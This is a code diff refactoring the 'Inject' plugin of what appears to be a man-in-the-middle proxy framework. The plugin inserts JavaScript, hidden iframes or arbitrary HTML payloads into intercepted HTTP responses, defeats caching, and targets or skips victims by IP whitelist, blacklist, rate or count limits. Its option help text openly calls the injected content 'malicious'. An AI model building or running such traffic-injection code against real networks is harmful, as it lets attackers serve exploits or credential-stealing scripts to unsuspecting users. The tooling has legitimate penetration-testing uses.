@@ -53,18 +53,6 @@ class Inject(CacheKill, Plugin):
         self.match_str    = options.match_str
         self.html_payload = options.html_payload
 
-        if self.white_ips:
-            temp = []
-            for ip in self.white_ips.split(','):
-                temp.append(ip)
-            self.white_ips = temp
-
-        if self.black_ips:
-            temp = []
-            for ip in self.black_ips.split(','):
-                temp.append(ip)
-            self.black_ips = temp
-
         if self.options.preserve_cache:
             self.implements.remove("handleHeader")
             self.implements.remove("connectionMade")
@@ -82,8 +70,8 @@ class Inject(CacheKill, Plugin):
         #If you have MSF on another host, you may need to check prior to injection
         #print "http://" + request.client.getRequestHostname() + request.uri
         ip, hn, mime = self._get_req_info(request)
-        if self._should_inject(ip, hn, mime) and (not self.js_src == self.html_src is not None or not self.html_payload == ""):
-            if hn not in self.proxyip: #prevents recursive injecting
+        if self._should_inject(ip, hn, mime) and self._ip_filter(ip) and (hn not in self.proxyip):
+            if (not self.js_src == self.html_src is not None or not self.html_payload == ""):
                 data = self._insert_html(data, post=[(self.match_str, self._get_payload())])
                 self.ctable[ip] = time.time()
                 self.dtable[ip+hn] = True
@@ -95,39 +83,28 @@ class Inject(CacheKill, Plugin):
     def _get_payload(self):
         return self._get_js() + self._get_iframe() + self.html_payload
 
-    def add_options(self, options):
-        options.add_argument("--js-url", type=str, help="Location of your (presumably) malicious Javascript.")
-        options.add_argument("--html-url", type=str, help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
-        options.add_argument("--html-payload", type=str, default="", help="String you would like to inject.")
-        options.add_argument("--html-file", type=argparse.FileType('r'), default=None, help="File containing code you would like to inject.")
-        options.add_argument("--match-str", type=str, default="</body>", help="String you would like to match and place your payload before. (</body> by default)")
-        options.add_argument("--preserve-cache", action="store_true", help="Don't kill the server/client caching.")
-        group = options.add_mutually_exclusive_group(required=False)
-        group.add_argument("--per-domain", action="store_true", default=False, help="Inject once per domain per client.")
-        group.add_argument("--rate-limit", type=float, default=None, help="Inject once every RATE_LIMIT seconds per client.")
-        group.add_argument("--count-limit", type=int, default=None, help="Inject only COUNT_LIMIT times per client.")
-        group.add_argument("--white-ips", type=str, default=None, help="Inject content ONLY for these ips")
-        group.add_argument("--black-ips", type=str, default=None, help="DO NOT inject content for these ips")
-
-    def _should_inject(self, ip, hn, mime):
+    def _ip_filter(self, ip):
 
         if self.white_ips is not None:
-            if ip in self.white_ips:
+            if ip in self.white_ips.split(','):
                 return True
             else:
                 return False
 
         if self.black_ips is not None:
-            if ip in self.black_ips:
+            if ip in self.black_ips.split(','):
                 return False
             else:
                 return True
+
+        return True
+
+    def _should_inject(self, ip, hn, mime):
 
         if self.count_limit == self.rate_limit is None and not self.per_domain:
             return True
 
         if self.count_limit is not None and self.count > self.count_limit:
-            #print "1"
             return False
 
         if self.rate_limit is not None:
@@ -176,3 +153,17 @@ class Inject(CacheKill, Plugin):
             data = re.sub(r, post[i][1]+"\g<match>", data)
 
         return data
+
+    def add_options(self, options):
+        options.add_argument("--js-url", type=str, help="Location of your (presumably) malicious Javascript.")
+        options.add_argument("--html-url", type=str, help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
+        options.add_argument("--html-payload", type=str, default="", help="String you would like to inject.")
+        options.add_argument("--html-file", type=argparse.FileType('r'), default=None, help="File containing code you would like to inject.")
+        options.add_argument("--match-str", type=str, default="</body>", help="String you would like to match and place your payload before. (</body> by default)")
+        options.add_argument("--preserve-cache", action="store_true", help="Don't kill the server/client caching.")
+        group = options.add_mutually_exclusive_group(required=False)
+        group.add_argument("--per-domain", action="store_true", default=False, help="Inject once per domain per client.")
+        group.add_argument("--rate-limit", type=float, default=None, help="Inject once every RATE_LIMIT seconds per client.")
+        group.add_argument("--count-limit", type=int, default=None, help="Inject only COUNT_LIMIT times per client.")
+        group.add_argument("--white-ips", type=str, default=None, help="Inject content ONLY for these ips")
+        group.add_argument("--black-ips", type=str, default=None, help="DO NOT inject content for these ips")
